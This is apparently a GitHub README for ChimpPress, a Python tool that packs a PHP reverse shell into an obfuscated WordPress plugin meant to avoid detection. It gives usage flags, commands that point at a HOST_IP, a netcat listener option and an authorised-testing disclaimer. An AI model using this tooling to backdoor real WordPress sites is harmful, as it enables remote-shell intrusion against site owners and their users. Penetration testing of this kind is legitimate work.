
# ChimpPress
ChimpPress is a Python-based tool designed for generating malicious WordPress plugins. It takes a PHP reverse shell and embeds it into a custom, obfuscated WordPress plugin. The plugin is then compressed into a zip archive ready for deployment. The tool also provides the ability to listen for incoming connections after the plugin has been deployed.

## Features
-   Embeds a PHP reverse shell into a custom WordPress plugin
-   Obfuscates the plugin code to avoid detection
-   Compresses the plugin into a zip archive ready for deployment
-   Provides the ability to listen for incoming connections after the plugin has been deployed

## Usage
    usage: chimpPress.py [-h] [-i INPUT] [-l] [-o OUTPUT] [-p PORT] host

    positional arguments:
      host                          host to connect back to
    
    options:
      -h, --help                    show this help message and exit
      -i INPUT, --input INPUT       custom PHP reverse shell file to add to the plugin
      -l, --listener                start a netcat listener after generating the plugin
      -o OUTPUT, --output OUTPUT    name of the file to be generated
      -p PORT, --port PORT          port to listen on

## Getting Started
1.  Clone the repository: `git clone https://github.com/MachadoOtto/magik-monkee.git`
2.  Install Python 3 if not already installed.
3.  If using the Netcat listener, ensure that Netcat is installed and available in the system path.
4.  Run chimpPress.py with the desired arguments.

## Examples
1.  Basic usage with default port:

        python chimpPress.py HOST_IP
    
2.  Use a custom PHP reverse shell:

        python chimpPress.py HOST_IP -i /path/to/reverse_shell.php

3.  Custom port and start a Netcat listener:

        python chimpPress.py HOST_IP -p 1234 -l

## License

This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/MachadoOtto/chimpPress/main/LICENSE) file for details.

## Disclaimer
This script is provided as-is, without any warranties or guarantees. Use this tool responsibly and only on systems and applications you are authorized to test. If you use it for evil you should feel bad :(

- The Monada 🙈🙉🙊